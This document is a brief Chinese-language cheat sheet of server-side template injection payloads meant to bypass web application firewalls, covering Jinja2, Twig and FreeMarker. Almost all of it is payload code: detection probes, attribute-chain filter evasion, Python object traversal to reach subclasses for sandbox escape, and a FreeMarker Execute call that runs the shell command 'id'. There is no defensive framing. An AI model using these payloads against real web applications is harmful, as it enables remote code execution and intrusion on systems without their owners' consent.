# SSTI WAF绕过

## Jinja2绕过

### 基础检测

```
{{7*7}}
{{config}}
```

### 编码绕过

```
{{request['application']['__class__']['__bases__']}}
{{request|attr('application')|attr('__class__')|attr('__bases__')}}
```

### 字符串拼接

```
{{''.__class__.__mro__[2].__subclasses__()}}
{{(x for x in [1]).__class__.__bases__[0].__subclasses__()}}
```

---

## Twig绕过

```
{{7*7}}
{{_self.env.display.block_name}}
{{_self.env.getLoader().getTemplate('test').render()}}
```

---

## FreeMarker绕过

```
${7*7}
${"freemarker.template.utility.Execute"?new()("id")}
```
